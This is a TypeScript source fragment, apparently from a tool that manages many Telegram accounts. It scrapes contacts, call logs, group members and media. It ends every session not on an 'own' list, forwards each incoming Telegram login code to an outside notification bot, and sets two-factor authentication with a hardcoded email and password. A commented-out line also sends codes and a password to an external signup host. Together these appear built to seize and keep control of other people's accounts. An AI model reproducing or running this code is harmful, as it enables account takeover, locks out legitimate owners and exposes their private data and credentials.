Api.channels.ChannelParticipants) {\n                const users = participants.participants;\n\n                console.log(`Members: ${users.length}`);\n                for (const user of users) {\n                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\n                    if (userInfo) {\n                        const userDetails = <Api.User>await this.client.getEntity(userInfo);\n                        // console.log(\n                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"\n                        //     }, Username: ${userDetails.username || \"\"}`\n                        // );\n                        result.push({\n                            tgId: userDetails.id,\n                            name: `${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"}`,\n                            username: `${userDetails.username || \"\"}`,\n                        })\n                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\n                            console.log(JSON.stringify(userDetails.id))\n                        }\n                    } else {\n                        console.log(JSON.stringify((user as any)?.userId))\n                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)\n                    }\n                }\n            } else {\n                console.log(\"No members found or invalid group.\");\n            }\n            console.log(result.length)\n            return result;\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\n        const messages = await this.client.getMessages(entityLike, { limit });\n        return messages;\n    }\n    async getDialogs(params: IterDialogsParams) {\n        const chats = await this.client.getDialogs(params);\n        console.log(\"TotalChats:\", chats.total);\n        return chats;\n    }\n\n    async getSelfMSgsInfo(): Promise<{\n        photoCount: number;\n        videoCount: number;\n        movieCount: number,\n        total: number,\n        ownPhotoCount: number,\n        otherPhotoCount: number,\n        ownVideoCount: number,\n        otherVideoCount: number\n    }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const self = <Api.User>await this.client.getMe();\n        const selfChatId = self.id;\n\n        let photoCount = 0;\n        let ownPhotoCount = 0;\n        let ownVideoCount = 0;\n        let otherPhotoCount = 0;\n        let otherVideoCount = 0;\n        let videoCount = 0;\n        let movieCount = 0;\n\n        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed\n        for (const message of messageHistory) {\n            const text = message.text.toLocaleLowerCase();\n            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                movieCount++\n            } else {\n                if (message.photo) {\n                    photoCount++;\n                    if (!message.fwdFrom) {\n                        ownPhotoCount++\n                    } else {\n                        otherPhotoCount++\n                    }\n                } else if (message.video) {\n                    videoCount++;\n                    if (!message.fwdFrom) {\n                        ownVideoCount++\n                    } else {\n                        otherVideoCount++\n                    }\n                }\n            }\n        }\n\n        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })\n    }\n    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 1500 });\n        let canSendTrueCount = 0;\n        let canSendFalseCount = 0;\n        let totalCount = 0;\n        this.channelArray.length = 0;\n        const canSendFalseChats = [];\n        console.log(\"TotalChats:\", chats.total);\n        for (const chat of chats) {\n            if (chat.isChannel || chat.isGroup) {\n                try {\n                    const chatEntity = <Api.Channel>chat.entity.toJSON();\n                    const { broadcast, defaultBannedRights, id } = chatEntity;\n                    totalCount++;\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\n                        canSendTrueCount++;\n                        this.channelArray.push(id.toString()?.replace(/^-100/, \"\"));\n                    } else {\n                        canSendFalseCount++;\n                        canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\n                    }\n                } catch (error) {\n                    parseError(error);\n                }\n            }\n        };\n        return {\n            chatsArrayLength: totalCount,\n            canSendTrueCount,\n            canSendFalseCount,\n            ids: sendIds ? this.channelArray : [],\n            canSendFalseChats\n        };\n    }\n\n    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {\n        try {\n            for (let i = 0; i < data.length; i++) {\n                const user = data[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\";\n                try {\n                    await this.client.invoke(\n                        new Api.contacts.AddContact({\n                            firstName,\n                            lastName,\n                            phone: user.mobile,\n                            id: user.tgId\n                        })\n                    );\n                } catch (e) {\n                    console.log(e)\n                }\n            }\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async addContacts(mobiles: string[], namePrefix: string) {\n        try {\n            const inputContacts: Api.TypeInputContact[] = [];\n\n            // Iterate over the data array and generate input contacts\n            for (let i = 0; i < mobiles.length; i++) {\n                const user = mobiles[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\"; // Optional, no last name provided\n\n                // Generate client_id as a combination of i and j (for uniqueness)\n                // Since we only have one phone per user here, j will always be 0\n                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone\n\n                inputContacts.push(new Api.InputPhoneContact({\n                    clientId: clientId,\n                    phone: user, // mobile number\n                    firstName: firstName,\n                    lastName: lastName\n                }));\n            }\n\n            // Call the API to import contacts\n            const result = await this.client.invoke(\n                new Api.contacts.ImportContacts({\n                    contacts: inputContacts,\n                })\n            );\n\n            console.log(\"Imported Contacts Result:\", result);\n\n\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async leaveChannels(chats: string[]) {\n        console.log(\"Leaving Channels: initaied!!\");\n        console.log(\"ChatsLength: \", chats)\n        for (const id of chats) {\n            try {\n                const channelId = id.startsWith('-100') ? id : `-100${id}`;\n                await this.client.invoke(\n                    new Api.channels.LeaveChannel({\n                        channel: channelId\n                    })\n                );\n                console.log(`${this.phoneNumber} Left channel :`, id);\n                if (chats.length > 1) {\n                    await sleep(3000);\n                }\n            } catch (error) {\n                const errorDetails = parseError(error, `${this.phoneNumber} Failed to leave channel  ${id}:`);\n                if (errorDetails.message.includes('CHANNEL_INVALID')) {\n                    try {\n                        const entity = await this.client.getInputEntity(id);\n                        await this.client.invoke(\n                            new Api.channels.LeaveChannel({\n                                channel: entity\n                            })\n                        );\n                    } catch (err) {\n                        console.warn(`${this.phoneNumber} Cannot fetch entity for: ${id}, likely not a member or invalid`);\n                        continue;\n                    }\n\n                }\n            }\n        }\n        console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);\n    }\n\n    async getEntity(entity: Api.TypeEntityLike) {\n        return await this.client?.getEntity(entity)\n    }\n\n    async joinChannel(entity: Api.TypeEntityLike) {\n        console.log(\"trying to join channel : \", entity)\n        return await this.client?.invoke(\n            new Api.channels.JoinChannel({\n                channel: await this.client?.getEntity(entity)\n            })\n        );\n    }\n\n    connected() {\n        return this.client.connected;\n    }\n\n    async connect() {\n        return await this.client.connect();\n    }\n\n    async removeOtherAuths(): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        for (const auth of result.authorizations) {\n            if (this.isAuthMine(auth)) {\n                continue;\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\n                await this.resetAuthorization(auth);\n            }\n        }\n    }\n\n    private isAuthMine(auth: Api.Authorization): boolean {\n        const authCriteria = [\n            { field: 'country', value: 'singapore' },\n            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },\n            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }\n        ];\n\n        return authCriteria.some(criterion => {\n            const fieldValue = auth[criterion.field]?.toLowerCase?.() || '';\n\n            if (criterion.field === 'deviceModel' && fieldValue.endsWith('ssk')) {\n                return true;\n            }\n\n            if ('values' in criterion) {\n                return criterion.values.some(value =>\n                    fieldValue.includes(value.toLowerCase())\n                );\n            }\n\n            return fieldValue.includes(criterion.value.toLowerCase());\n        });\n    }\n\n\n    private async resetAuthorization(auth: Api.Authorization): Promise<void> {\n        try {\n            await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\n        } catch (error) {\n            parseError(error, `Failed to reset authorization for ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel} `);\n        }\n    }\n\n    async getAuths(): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        return result;\n    }\n\n    async getAllChats(): Promise<any[]> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 500 });\n        console.log(\"TotalChats:\", chats.total);\n        const chatData = [];\n        for (const chat of chats) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {\n        const messages = await this.client.getMessages(chatId, {\n            offsetId: offset,\n            limit,\n        });\n\n        const result = await Promise.all(messages.map(async (message: Api.Message) => {\n            const media = message.media\n                ? {\n                    type: message.media.className.includes('video') ? 'video' : 'photo',\n                    thumbnailUrl: await this.getMediaUrl(message),\n                }\n                : null;\n\n            return {\n                id: message.id,\n                message: message.message,\n                date: message.date,\n                sender: {\n                    id: message.senderId?.toString(),\n                    is_self: message.out,\n                    username: message.fromId ? message.fromId.toString() : null,\n                },\n                media,\n            };\n        }));\n\n        return result;\n    }\n\n    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\n        if (message.media instanceof Api.MessageMediaPhoto) {\n            console.log(\"messageId image:\", message.id)\n            const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n\n        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n            console.log(\"messageId video:\", message.id)\n            const sizes = message.document?.thumbs || [1]\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n        }\n        return null;\n    }\n\n    async sendInlineMessage(chatId: string, message: string, url: string) {\n        const button = {\n            text: \"Open URL\",\n            url: url,\n        };\n        const result = await this.client.sendMessage(chatId, {\n            message: message,\n            buttons: [new Api.KeyboardButtonUrl(button)]\n        })\n        return result;\n    }\n\n    async getMediaMessages() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhotos(),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n        return result\n    }\n\n\n    async getCallLog() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n\n            // const callInfo = {\n            //     callId: logAction.callId.toString(),\n            //     duration: logAction.duration,\n            //     video: logAction.video,\n            //     timestamp: log.date\n            // };\n\n            // Categorize by type\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n\n            // Count calls per chat ID\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            if (!filteredResults.chatCallCounts[chatId]) {\n                const ent = <Api.User>await this.client.getEntity(chatId)\n                filteredResults.chatCallCounts[chatId] = {\n                    phone: ent.phone,\n                    username: ent.username,\n                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\n                    count: 0\n                };\n            }\n            filteredResults.chatCallCounts[chatId].count++;\n        }\n        const filteredChatCallCounts = [];\n        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {\n            if (details['count'] > 4) {\n                let video = 0;\n                let photo = 0\n                const msgs = await this.client.getMessages(chatId, { limit: 600 })\n                for (const message of msgs) {\n                    const text = message.text.toLocaleLowerCase();\n                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                        if (message.media instanceof Api.MessageMediaPhoto) {\n                            photo++\n                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                            video++\n                        }\n                    }\n                }\n                filteredChatCallCounts.push({\n                    ...(details as any),\n                    msgs: msgs.total,\n                    video,\n                    photo,\n                    chatId,\n                })\n            }\n        }\n        console.log({\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        });\n\n        return {\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        };\n    }\n\n    async getCallLogsInternal() {\n        const finalResult = {}\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            finalResult[chatId] = filteredResults\n        }\n        return finalResult;\n    }\n    async handleEvents(event: NewMessageEvent) {\n        if (event.isPrivate) {\n            if (event.message.chatId.toString() == \"777000\") {\n                console.log(event.message.text.toLowerCase());\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nActiveClientSetup - ', TelegramManager.activeClientSetup);\n                console.log(\"Date :\", new Date(event.message.date * 1000))\n                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {\n                //     console.log(\"LoginText: \", event.message.text)\n                //     const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\n                //     console.log(\"Code is:\", code);\n                //     try {\n                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\n                //         console.log(\"Code Sent back\");\n                //     } catch (error) {\n                //         parseError(error)\n                //     }\n                // } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\\n${event.message.text}`)}`);\n                // await event.message.delete({ revoke: true });\n                // }\n            }\n        }\n    }\n\n    async updatePrivacyforDeletedAccount() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll(),\n                    ],\n                })\n            );\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async updateProfile(firstName: string, about: string) {\n        const data = {\n            lastName: \"\",\n        }\n        if (firstName !== undefined) {\n            data[\"firstName\"] = firstName\n        }\n        if (about !== undefined) {\n            data[\"about\"] = about\n        }\n        try {\n            const result = await this.client.invoke(\n                new Api.account.UpdateProfile(data)\n            );\n            console.log(\"Updated NAme: \", firstName);\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async downloadProfilePic(photoIndex: number) {\n        try {\n            const photos = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: 'me',\n                    offset: 0,\n                })\n            );\n\n            if (photos.photos.length > 0) {\n                console.log(`You have ${photos.photos.length} profile photos.`);\n\n                // Choose the photo index (0-based)\n                if (photoIndex < photos.photos.length) {\n                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\n\n                    // Extract the largest photo file (e.g., highest resolution)\n                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)\n                    const photoFileSize = selectedPhoto.sizes[index];\n\n                    // Download the file\n                    const photoBuffer = await this.client.downloadFile(\n                        new Api.InputPhotoFileLocation({\n                            id: selectedPhoto.id,\n                            accessHash: selectedPhoto.accessHash,\n                            fileReference: selectedPhoto.fileReference,\n                            thumbSize: photoFileSize.type\n                        }), {\n                        dcId: selectedPhoto.dcId, // Data center ID\n                    });\n\n                    if (photoBuffer) {\n                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\n                        fs.writeFileSync(outputPath, photoBuffer);\n                        console.log(`Profile picture downloaded as '${outputPath}'`);\n                        return outputPath;\n                    } else {\n                        console.log(\"Failed to download the photo.\");\n                    }\n                } else {\n                    console.log(`Photo index ${photoIndex} is out of range.`);\n                }\n            } else {\n                console.log(\"No profile photos found.\");\n            }\n        } catch (err) {\n            console.error(\"Error:\", err);\n        }\n    }\n    async getLastActiveTime() {\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        let latest = 0\n        result.authorizations.map((auth) => {\n            if (!this.isAuthMine(auth)) {\n                if (latest < auth.dateActive) {\n                    latest = auth.dateActive;\n                }\n            }\n        });\n        return (new Date(latest * 1000)).toISOString().split('T')[0];\n    }\n\n    async getContacts() {\n        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({\n            hash: bigInt(0)\n        }));\n        return exportedContacts;\n    }\n\n    async deleteChat(params: {\n        peer: string | Api.TypeInputPeer;\n        maxId?: number;\n        justClear?: boolean;\n        revoke?: boolean;\n        minDate?: number;\n        maxDate?: number;\n    }) {\n        try {\n            await this.client.invoke(new Api.messages.DeleteHistory(params));\n            console.log(`Dialog with ID ${params.peer} has been deleted.`);\n        } catch (error) {\n            console.error('Failed to delete dialog:', error);\n        }\n    }\n\n    async blockUser(chatId: string) {\n        try {\n            await this.client?.invoke(new Api.contacts.Block({\n                id: chatId,\n            }));\n            console.log(`User with ID ${chatId} has been blocked.`);\n        } catch (error) {\n            console.error('Failed to block user:', error);\n        }\n    }\n\n    async getMediaMetadata(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        limit?: number;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;\n\n        const query: Partial<IterMessagesParams> = {\n            limit: limit || 500,\n            ...(maxId ? { maxId } : {}),\n            ...(minId ? { minId } : {}),\n            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),\n            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })\n        };\n\n        const ent = await this.safeGetEntity(chatId);\n        console.log(query);\n        const messages = await this.client.getMessages(ent, query);\n        console.log(`Fetched ${messages.length} messages`);\n\n        const filteredMessages = messages.map(message => {\n            const messageIds: number[] = [];\n            if (message.media) {\n                const mediaType = this.getMediaType(message.media);\n                if (types.includes(mediaType)) {\n                    messageIds.push(message.id);\n                }\n            }\n            return messageIds;\n        }).flat();\n\n        return {\n            messages: filteredMessages,\n            total: messages.total,\n            hasMore: messages.length == limit,\n            lastOffsetId: messages[messages.length - 1].id\n        };\n    }\n\n    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {\n        try {\n            const entity = await this.safeGetEntity(chatId);\n            const messages = await this.client.getMessages(entity, { ids: [messageId] });\n            const message = <Api.Message>messages[0];\n\n            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {\n                const media = message.media;\n                let contentType, filename, fileLocation;\n                const inputLocation = message.video || <Api.Photo>message.photo;\n\n                const data = {\n                    id: inputLocation.id,\n                    accessHash: inputLocation.accessHash,\n                    fileReference: inputLocation.fileReference,\n                };\n\n                if (media instanceof Api.MessageMediaPhoto) {\n                    contentType = 'image/jpeg';\n                    filename = 'photo.jpg';\n                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\n                } else if (media instanceof Api.MessageMediaDocument) {\n                    contentType = (media as any).mimeType || 'video/mp4';\n                    filename = 'video.mp4';\n                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\n                } else {\n                    return res.status(415).send('Unsupported media type');\n                }\n\n                res.setHeader('Content-Type', contentType);\n                res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n\n                const chunkSize = 512 * 1024; // 512 KB chunks\n\n                for await (const chunk of this.client.iterDownload({\n                    file: fileLocation,\n                    offset: bigInt[0],\n                    limit: 5 * 1024 * 1024, // 80 MB limit\n                    requestSize: chunkSize,\n                })) {\n                    res.write(chunk); // Stream each chunk to the client\n                }\n                res.end();\n            } else {\n                res.status(404).send('Media not found');\n            }\n        } catch (error) {\n            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {\n                return res.status(404).send('File reference expired');\n            }\n            console.error('Error downloading media:', error);\n            res.status(500).send('Error downloading media');\n        }\n    }\n\n    private async downloadWithTimeout<T>(promise: Promise<T>, timeout: number): Promise<T> {\n        return Promise.race([\n            promise,\n            new Promise<T>((_, reject) =>\n                setTimeout(() => reject(new Error('Download timeout')), timeout)\n            )\n        ]);\n    }\n\n    private getMediaDetails(media: Api.MessageMediaDocument) {\n        if (!media?.document) return null;\n\n        const doc = media.document;\n        if (doc instanceof Api.DocumentEmpty) return null;\n        const videoAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeVideo\n        ) as Api.DocumentAttributeVideo;\n\n        const fileNameAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeFilename\n        ) as Api.DocumentAttributeFilename;\n\n        return {\n            size: doc.size,\n            mimeType: doc.mimeType,\n            fileName: fileNameAttr?.fileName || null,\n            duration: videoAttr?.duration || null,\n            width: videoAttr?.w || null,\n            height: videoAttr?.h || null\n        };\n    }\n\n    private async downloadFileFromUrl(url: string): Promise<Buffer> {\n        try {\n            const response = await axios.get(url, {\n                responseType: 'arraybuffer',\n                timeout: 30000\n            });\n            return Buffer.from(response.data);\n        } catch (error) {\n            throw new Error(`Failed to download file: ${error.message}`);\n        }\n    }\n\n    async forwardMessage(toChatId: string, fromChatId: string, messageId: number) {\n        try {\n            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId })\n        } catch (error) {\n            console.log(\"Failed to Forward Message : \", error.errorMessage);\n        }\n    }\n\n    async updateUsername(baseUsername) {\n        let newUserName = ''\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\n        let increment = 0;\n\n        if (username === '') {\n            try {\n                await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                console.log(`Removed Username successfully.`);\n            } catch (error) {\n                console.log(error)\n            }\n        } else {\n            while (increment < 10) {\n                try {\n                    const result = await this.client.invoke(\n                        new Api.account.CheckUsername({ username })\n                    );\n                    console.log(result, \" - \", username)\n                    if (result) {\n                        await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                        console.log(`Username '${username}' updated successfully.`);\n                        newUserName = username\n                        break;\n                    } else {\n                        // Use only 2 numbers, no alphabets, for last 4 attempts (6, 7, 8, 9)\n                        if (increment >= 6) {\n                            const randomNums = Math.floor(Math.random() * 90 + 10); // 2 digit number\n                            username = baseUsername + randomNums;\n                        } else {\n                            username = baseUsername + increment;\n                        }\n                        increment++;\n                        await sleep(2000);\n                    }\n                } catch (error) {\n                    console.log(error.message)\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\n                        newUserName = username;\n                        break;\n                    }\n                    // Use random characters for last 4 attempts (6, 7, 8, 9)\n                    if (increment >= 6) {\n                        const randomChars = Math.random().toString(36).substring(2, 6);\n                        username = baseUsername + randomChars;\n                    } else {\n                        username = baseUsername + increment;\n                    }\n                    increment++;\n                    await sleep(2000);\n                }\n            }\n        }\n        return newUserName;\n    }\n\n    async updatePrivacy() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyForwards(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"forwards Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll(),\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n        }\n        catch (e) {\n            throw e\n        }\n    }\n\n    async sendViewOnceMedia(chatId: string, buffer: Buffer, caption = '', isVideo?: boolean, filename?: string): Promise<Api.TypeUpdates> {\n        if (!this.client) throw new Error('Client is not initialized');\n\n        try {\n            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;\n            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';\n            const inputFile = await this.client.uploadFile({\n                file: new CustomFile(actualFilename, buffer.length, actualFilename, buffer),\n                workers: 1\n            });\n            const result = await this.client.invoke(new Api.messages.SendMedia({\n                peer: chatId,\n                media: isVideo\n                    ? new Api.InputMediaUploadedDocument({\n                        file: inputFile,\n                        mimeType,\n                        attributes: [\n                            new Api.DocumentAttributeVideo({\n                                supportsStreaming: true,\n                                duration: 0,\n                                w: 0,\n                                h: 0\n                            })\n                        ],\n                        ttlSeconds: 10\n                    })\n                    : new Api.InputMediaUploadedPhoto({\n                        file: inputFile,\n                        ttlSeconds: 10\n                    }),\n                message: caption,\n                randomId: bigInt(Math.floor(Math.random() * 1000000000))\n            }));\n\n            console.log(`Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);\n            return result;\n        } catch (error) {\n            console.error('Error sending view-once media:', error);\n            throw error;\n        }\n    }\n\n\n    async getFileUrl(url: string, filename: string): Promise<string> {\n        const response = await axios.get(url, { responseType: 'stream' });\n        const filePath = `/tmp/${filename}`;\n        await new Promise((resolve, reject) => {\n            const writer = fs.createWriteStream(filePath);\n            response.data.pipe(writer);\n            writer.on('finish', () => resolve(true));\n            writer.on('error', reject);\n        });\n        return filePath;\n    }\n\n    async updateProfilePic(image) {\n        try {\n            const file = await this.client.uploadFile({\n                file: new CustomFile(\n                    'pic.jpg',\n                    fs.statSync(\n                        image\n                    ).size,\n                    image\n                ),\n                workers: 1,\n            });\n            console.log(\"file uploaded\")\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\n                file: file,\n            }));\n            console.log(\"profile pic updated\")\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async hasPassword() {\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\n        return passwordInfo.hasPassword\n    }\n\n    async set2fa() {\n        if (!(await this.hasPassword())) {\n            console.log(\"Password Does not exist, Setting 2FA\");\n\n            const imapService = MailReader.getInstance();\n            const twoFaDetails = {\n                email: \"storeslaksmi@gmail.com\",\n                hint: \"password - India143\",\n                newPassword: \"Ajtdmwajt1@\",\n            };\n\n            try {\n                await imapService.connectToMail();\n                const checkMailInterval = setInterval(async () => {\n                    